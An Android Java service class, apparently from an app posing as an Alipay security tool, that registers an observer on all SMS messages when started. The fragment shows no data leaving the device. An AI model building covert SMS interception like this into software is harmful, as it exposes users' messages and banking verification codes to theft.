package com.alipay.safe.service;

import com.alipay.safe.receiver.SmsContentObserver;
import com.alipay.safe.util.SmsUtil;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;

public class ListenService extends Service {

	private SmsContentObserver smsCO = null;

	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public void onCreate() {
		super.onCreate();

		smsCO = new SmsContentObserver(null, ListenService.this);
		getContentResolver().registerContentObserver(Uri.parse(SmsUtil.SMS_URI_ALL), true, smsCO);
	}

	@Override
	public void onDestroy() {
		if (smsCO != null) {
			getContentResolver().unregisterContentObserver(smsCO);
		}
		super.onDestroy();
	}

}
